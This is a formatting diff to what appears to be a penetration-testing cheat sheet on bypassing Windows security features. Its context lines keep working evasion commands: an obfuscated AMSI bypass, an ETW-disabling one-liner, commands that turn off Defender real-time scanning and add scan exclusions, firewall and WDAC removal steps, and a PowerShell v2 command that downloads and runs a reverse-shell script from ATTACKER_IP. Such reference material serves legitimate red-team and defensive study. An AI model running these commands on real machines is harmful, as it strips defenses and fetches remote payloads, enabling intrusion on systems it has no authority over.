@@ -22,12 +22,12 @@
 * [Windows Defender Firewall](#windows-defender-firewall)
 * [Windows Information Protection](#windows-information-protection)
 
-
 ## AppLocker
 
 > AppLocker is a security feature in Microsoft Windows that provides administrators with the ability to control which applications and files users are allowed to run on their systems. The rules can be based on various criteria, such as the file path, file publisher, or file hash, and can be applied to specific users or groups.
 
 * Enumerate Local AppLocker Effective Policy
+
     ```powershell
     PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     PowerView PS C:\> Get-AppLockerPolicy -effective -xml
@@ -46,11 +46,14 @@
 UAC stands for User Account Control. It is a security feature introduced by Microsoft in Windows Vista and is present in all subsequent versions of the Windows operating system. UAC helps mitigate the impact of malware and helps protect users by asking for permission or an administrator's password before allowing changes to be made to the system that could potentially affect all users of the computer.
 
 * Check if UAC is enabled
+
     ```ps1
     REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
     ```
+
 * Check UAC level
-    ```
+
+    ```ps1
     REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
     REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
     ```
@@ -62,11 +65,11 @@ UAC stands for User Account Control. It is a security feature introduced by Micr
 | 1 | 0 | 0 | No UAC for RID 500 |
 | 1 | 0 | 1 | UAC for Everyone |
 
-
 * UAC Bypass
     * [AutoElevated binary signed by Microsoft](https://www.elastic.co/guide/en/security/current/bypass-uac-via-sdclt.html) - `msconfig`, `sdclt.exe`, `eventvwr.exe`, etc
     * [hfiref0x/UACME](https://github.com/hfiref0x/UACME) - Defeating Windows User Account Control
-    * Find process that auto elevate: 
+    * Find process that auto elevate:
+
         ```ps1
         strings.exe -s *.exe | findstr /I "<autoElevate>true</autoElevate>"
         ```
@@ -75,7 +78,6 @@ UAC stands for User Account Control. It is a security feature introduced by Micr
 
 Refer to [PayloadsAllTheThings/Windows - DPAPI.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20DPAPI.md)
 
-
 ## Powershell
 
 ### Execution Policy
@@ -83,11 +85,12 @@ Refer to [PayloadsAllTheThings/Windows - DPAPI.md](https://github.com/swisskyrep
 > PowerShell Execution Policy is a security feature that controls how scripts run on a system. It helps prevent unauthorized scripts from executing, but it is not a security boundary—it only prevents accidental execution of unsigned scripts.
 
 * Check current policy
+
     ```ps1
     Get-ExecutionPolicy
     ```
 
-| Policy	    | Description                                       |
+| Policy     | Description                                       |
 | ------------- | ------------------------------------------------- |
 | Restricted    | No scripts allowed (default in some systems).     |
 | AllSigned     | Only runs signed scripts.                         |
@@ -97,23 +100,25 @@ Refer to [PayloadsAllTheThings/Windows - DPAPI.md](https://github.com/swisskyrep
 
 * `Restricted`: it prevents the execution of all scripts (the default for workstations).
 * `RemoteSigned`: it blocks the execution of unsigned scripts downloaded from the Internet, but allows the execution of "local" scripts (the default on servers). The command `Unblock-File` can be used to remove the Mark-of-the-Web (MotW) and make a downloaded script look like a "local" script.
+
     ```ps1
     # Bypass
     Unblock-File my-file-from-internet
     ```
+
 * `AllSigned`: it blocks unsigned scripts. This is the most secure option.
+
     ```ps1
     # Bypass
     Get-Content .\run.ps1 | Invoke-Expression
     ```
 
-You can just run `powershell.exe` with the option `-ep Bypass`, or use the built-in command `Set-ExecutionPolicy`. 
+You can just run `powershell.exe` with the option `-ep Bypass`, or use the built-in command `Set-ExecutionPolicy`.
 
 ```ps1
 powershell -ep bypass
 Set-ExecutionPolicy Bypass -Scope Process -Force
 ```
-
 
 ### Anti Malware Scan Interface
 
@@ -125,14 +130,15 @@ Find more AMSI bypass: [Windows - AMSI Bypass.md](https://github.com/swisskyrepo
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
 ```
 
-
 ### Just Enough Administration
 
 > Just-Enough-Administration (JEA) is a feature in Microsoft Windows Server that allows administrators to delegate specific administrative tasks to non-administrative users. JEA provides a secure and controlled way to grant limited, just-enough access to systems, while ensuring that the user cannot perform unintended actions or access sensitive information.
 
 Breaking out if JEA:
+
 * List available cmdlets: `command`
 * Look for non-default cmdlets:
+
     ```ps1
     Set-PSSessionConfiguration
     Start-Process
@@ -140,19 +146,20 @@ Breaking out if JEA:
     Add-Computer
     ```
 
-
 ### Constrained Language Mode
 
 Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`
 
 * Bypass using an old Powershell. Powershell v2 doesn't support CLM.
+
     ```ps1
     powershell.exe -version 2
     powershell.exe -version 2 -ExecutionPolicy bypass
     powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
     ```
 
-* Bypass when `__PSLockDownPolicy` is used. Just put "System32" somewhere in the path. 
+* Bypass when `__PSLockDownPolicy` is used. Just put "System32" somewhere in the path.
+
     ```ps1
     # Enable CLM from the environment
     [Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
@@ -171,7 +178,8 @@ Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageM
     ```
 
 * Bypass using COM: [xpn/COM_to_registry.ps1](https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1)
-* Bypass using your own Powershell DLL: [p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll) & [iomoath/PowerShx](https://github.com/iomoath/PowerShx) 
+* Bypass using your own Powershell DLL: [p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll) & [iomoath/PowerShx](https://github.com/iomoath/PowerShx)
+
     ```ps1
     rundll32 PowerShdll,main <script>
     rundll32 PowerShdll,main -h      Display this message
@@ -187,7 +195,6 @@ Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageM
     rundll32 PowerShx.dll,main -s                           Attempt to bypass AMSI
     rundll32 PowerShx.dll,main -v                           Print Execution Output to the console
     ```
-
 
 ### Script Block and Module Logging
 
@@ -210,17 +217,16 @@ function Enable-PSScriptBlockLogging
 }
 ```
 
-Disable ETW of the current PowerShell session with [tandasat/KillETW.ps1](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32): 
+Disable ETW of the current PowerShell session with [tandasat/KillETW.ps1](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32):
 
 ```ps1
 # This PowerShell command sets 0 to System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled which effectively disables Suspicious ScriptBlock Logging etc.
 [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
 ```
 
-
 ### PowerShell Transcript
 
-PowerShell Transcript is a logging feature that records all commands and output from a PowerShell session. It helps with auditing, debugging, and troubleshooting by saving session activity to a text file. 
+PowerShell Transcript is a logging feature that records all commands and output from a PowerShell session. It helps with auditing, debugging, and troubleshooting by saving session activity to a text file.
 
 Start a transcript and store the output in a custom file.
 
@@ -234,7 +240,6 @@ Common locations for PowerShell transcripts outputs:
 C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
 C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
 ```
-
 
 ### SecureString
 
@@ -266,7 +271,6 @@ $pass = (echo "AA...AA=" | ConvertTo-SecureString -Key $key)
 [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))
 ```
 
-
 ## Protected Process Light
 
 Protected Process Light (PPL) is implemented as a Windows security mechanism that enables processes to be marked as "protected" and run in a secure, isolated environment, where they are shielded from attacks by malware or other unauthorized processes. PPL is used to protect processes that are critical to the operation of the operating system, such as anti-virus software, firewalls, and other security-related processes.
@@ -275,7 +279,7 @@ When a process is marked as "protected" using PPL, it is assigned a security lev
 
 A process's protection is defined by a combination of the "level" and the "signer". The following table represent commonly used combinations, from [itm4n.github.io](https://itm4n.github.io/lsass-runasppl/).
 
-| Protection level                | Value | Signer          | Type                | 		
+| Protection level                | Value | Signer          | Type                |
 |---------------------------------|------|------------------|---------------------|
 | PS_PROTECTED_SYSTEM             | 0x72 | WinSystem (7)    | Protected (2)       |
 | PS_PROTECTED_WINTCB             | 0x62 | WinTcb (6)       | Protected (2)       |
@@ -290,24 +294,26 @@ A process's protection is defined by a combination of the "level" and the "signe
 PPL works by restricting access to the protected process's memory and system resources, and by preventing the process from being modified or terminated by other processes or users. The process is also isolated from other processes running on the system, which helps prevent attacks that attempt to exploit shared resources or dependencies.
 
 * Check if LSASS is running in PPL
+
     ```ps1
     reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
     ```
+
 * Protected process example: you can't kill Microsoft Defender even with Administrator privilege.
+
     ```ps1
     taskkill /f /im MsMpEng.exe
     ERROR: The process "MsMpEng.exe" with PID 5784 could not be terminated.
     Reason: Access is denied.
     ```
-* Can be disabled using vulnerable drivers (Bring Your Own Vulnerable Driver / BYOVD)
 
+* Can be disabled using vulnerable drivers (Bring Your Own Vulnerable Driver / BYOVD)
 
 ## Credential Guard
 
-When Credential Guard is enabled, it uses hardware-based virtualization to create a secure environment that is separate from the operating system. This secure environment is used to store sensitive credential information, which is encrypted and protected from unauthorized access. 
+When Credential Guard is enabled, it uses hardware-based virtualization to create a secure environment that is separate from the operating system. This secure environment is used to store sensitive credential information, which is encrypted and protected from unauthorized access.
 
 Credential Guard uses a combination of hardware-based virtualization and the Trusted Platform Module (TPM) to ensure that the secure kernel is trusted and secure. It can be enabled on devices that have a compatible processor and TPM version, and require a UEFI firmware that supports the necessary features.
-
 
 ## Event Tracing for Windows
 
@@ -395,7 +401,6 @@ The `Microsoft-Windows-Threat-Intelligence` provider corresponds to ETWTI, an ad
 
 The most common bypassing technique is patching the function `EtwEventWrite` which is called to write/log ETW events. You can list the providers registered for a process with `logman query providers -pid <PID>`
 
-
 ## Attack Surface Reduction
 
 > Attack Surface Reduction (ASR) refers to strategies and techniques used to decrease the potential points of entry that attackers could use to exploit a system or network.
@@ -415,28 +420,31 @@ Add-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRu
 | Use advanced protection against ransomware                                | c1db55ab-c21a-4637-bb3f-a12568109d35 |
 | Block credential stealing from the Windows local security authority subsystem (lsass.exe) | 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 |
 
-
 ## Windows Defender Antivirus
 
 Also known as `Microsoft Defender`.
 
 * Check status of Defender
+
     ```powershell
     PS C:\> Get-MpComputerStatus
     ```
 
 * Disable scanning all downloaded files and attachments
+
     ```powershell
     PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
     PS C:\> Set-MpPreference -DisableIOAVProtection $true
     ```
 
 * Disable AMSI (set to 0 to enable)
+
     ```powershell
     PS C:\> Set-MpPreference -DisableScriptScanning 1 
     ```
 
 * Exclude a folder, a process from scanning
+
     ```powershell
     PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
     PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
@@ -444,11 +452,13 @@ Also known as `Microsoft Defender`.
     ```
 
 * Exclude a folder using WMI
+
     ```powershell
     PS C:\> WMIC /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath="C:\Users\Public\wmic"
     ```
 
 * Remove signatures. **NOTE**: if Internet connection is present, they will be downloaded again.
+
     ```powershell
     PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
     PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
@@ -459,16 +469,14 @@ Identify the exact bytes that are detected by Windows Defender Antivirus
 * [matterpreter/DefenderCheck](https://github.com/matterpreter/DefenderCheck) - Identifies the bytes that Microsoft Defender flags on
 * [gatariee/gocheck](https://github.com/gatariee/gocheck) - DefenderCheck but blazingly fast™
 
-
-
 ## Windows Defender Application Control
 
 Also known as `WDAC/UMCI/Device Guard`.
 
 > Windows Defender Application Guard, formerly known as Device Guard has the power to control if an application may or may not be executed on a Windows device. WDAC will prevent the execution, running, and loading of unwanted or malicious code, drivers, and scripts. WDAC does not trust any software it does not know of.
 
-
 * Get WDAC current mode
+
     ```ps1
     $ Get-ComputerInfo
     DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
@@ -476,20 +484,21 @@ Also known as `WDAC/UMCI/Device Guard`.
     ```
 
 * Remove WDAC policies using CiTool.exe (Windows 11 2022 Update)
+
     ```ps1
-    $ CiTool.exe -rp "{PolicyId GUID}" -json
+    CiTool.exe -rp "{PolicyId GUID}" -json
     ```
-    
+
 * Device Guard policy location: `C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip`
 * Device Guard example policies: `C:\Windows\System32\CodeIntegrity\ExamplePolicies\`
 * WDAC utilities: [mattifestation/WDACTools](https://github.com/mattifestation/WDACTools), a PowerShell module to facilitate building, configuring, deploying, and auditing Windows Defender Application Control (WDAC) policies
 * WDAC bypass techniques: [bohops/UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList)
     * [nettitude/Aladdin](https://github.com/nettitude/Aladdin) - WDAC Bypass using AddInProcess.exe
 
-
 ## Windows Defender Firewall
 
 * List firewall state and current configuration
+
     ```powershell
     netsh advfirewall firewall dump
     # or 
@@ -498,11 +507,13 @@ Also known as `WDAC/UMCI/Device Guard`.
     ```
 
 * List firewall's blocked ports
+
     ```powershell
     $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
     ```
 
 * Disable firewall
+
     ```powershell
     # Disable Firewall via cmd
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -515,18 +526,19 @@ Also known as `WDAC/UMCI/Device Guard`.
     netsh Advfirewall set allprofiles state off
     ```
 
-
 ## Windows Information Protection
 
-Windows Information Protection (WIP), formerly known as Enterprise Data Protection (EDP), is a security feature in Windows 10 that helps protect sensitive data on enterprise devices. WIP helps to prevent accidental data leakage by allowing administrators to define policies that control how enterprise data can be accessed, shared, and protected. WIP works by identifying and separating enterprise data from personal data on the device. 
+Windows Information Protection (WIP), formerly known as Enterprise Data Protection (EDP), is a security feature in Windows 10 that helps protect sensitive data on enterprise devices. WIP helps to prevent accidental data leakage by allowing administrators to define policies that control how enterprise data can be accessed, shared, and protected. WIP works by identifying and separating enterprise data from personal data on the device.
 
 Protection of file (data) locally marked as corporate is facilitated via Encrypting File System (EFS) encryption of Windows (a feature of NTFS file system)
 
 * Enumerate files attributes, `Encrypted` attribute is used for files protected by WIP
+
     ```ps1
     PS C:\> (Get-Item -Path 'C:\...').attributes
     Archive, Encrypted
     ```
+
 * Encrypt files: `cipher /c encryptedfile.extension`
 * Decrypt files: `cipher /d encryptedfile.extension`
 
@@ -536,7 +548,6 @@ The **Enterprise Context** column shows you what each app can do with your enter
 * **Personal**. Shows the text, Personal. This app is considered non-work-related and can't touch any work data or resources.
 * **Exempt**. Shows the text, Exempt. Windows Information Protection policies don't apply to these apps (such as, system components).
 
-
 ## BitLocker Drive Encryption
 
 BitLocker is a full-disk encryption feature included in Microsoft Windows operating systems starting with Windows Vista. It is designed to protect data by providing encryption for entire volumes. BitLocker uses AES encryption algorithm to encrypt data on the disk. When enabled, BitLocker requires a user to enter a password or insert a USB flash drive to unlock the encrypted volume before the operating system is loaded, ensuring that data on the disk is protected from unauthorized access. BitLocker is commonly used on laptops, portable storage devices, and other mobile devices to protect sensitive data in case of theft or loss.
@@ -545,7 +556,6 @@ When BitLocker is in `Suspended` state, boot the system using a Windows Setup US
 
 You can check if it is done decrypting using this command: `manage-bde -status`
 
-
 ## References
 
 * [SNEAKING PAST DEVICE GUARD - Cybereason - Philip Tsukerman](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)
@@ -553,7 +563,7 @@ You can check if it is done decrypting using this command: `manage-bde -status`
 * [Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - Apr 7, 2021](https://itm4n.github.io/lsass-runasppl/)
 * [Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - 03/10/2023 - Microsoft](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context)
 * [Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - 12/09/2022 - Microsoft](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate)
-* [DISABLING AV WITH PROCESS SUSPENSION - March 24, 2023 - By Christopher Paschen ](https://www.trustedsec.com/blog/disabling-av-with-process-suspension/)
+* [DISABLING AV WITH PROCESS SUSPENSION - March 24, 2023 - By Christopher Paschen](https://www.trustedsec.com/blog/disabling-av-with-process-suspension/)
 * [Disabling Event Tracing For Windows - UNPROTECT PROJECT - Tuesday 19 April 2022](https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/)
 * [ETW: Event Tracing for Windows 101 - ired.team](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)
 * [Remove Windows Defender Application Control (WDAC) policies - Microsoft - 12/09/2022](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies)
